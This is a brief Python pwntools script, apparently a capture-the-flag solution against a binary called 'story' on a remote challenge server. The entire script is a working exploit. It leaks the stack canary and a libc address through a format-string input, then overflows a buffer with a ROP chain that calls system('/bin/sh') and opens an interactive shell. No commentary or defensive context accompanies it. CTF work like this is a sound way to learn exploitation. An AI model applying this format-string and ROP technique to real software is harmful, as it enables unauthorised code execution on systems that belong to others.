from pwn import *
context.log_level='debug'
#p=process("./story")
p=remote("ctf2.linkedbyx.com",10525)
#gdb.attach(p,'b printf')
p.sendlineafter("ID:","%23$p|%25$p")
p.readuntil("ello ")
canary=int(p.readuntil("|")[:-1],16)
base=int(p.readline()[:-1],16)-(0x7ffff7a2d830-0x7ffff7a0d000)
log.warning(hex(canary))
log.warning(hex(base))
p.sendlineafter("story:\n",str(1024))
one=0x3ac5c
libc=ELF("./story").libc
libc.address=base
p.sendlineafter("story:\n","A"*0x88+p64(canary)*2+p64(0x0000000000400bd3)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system']))
p.interactive()
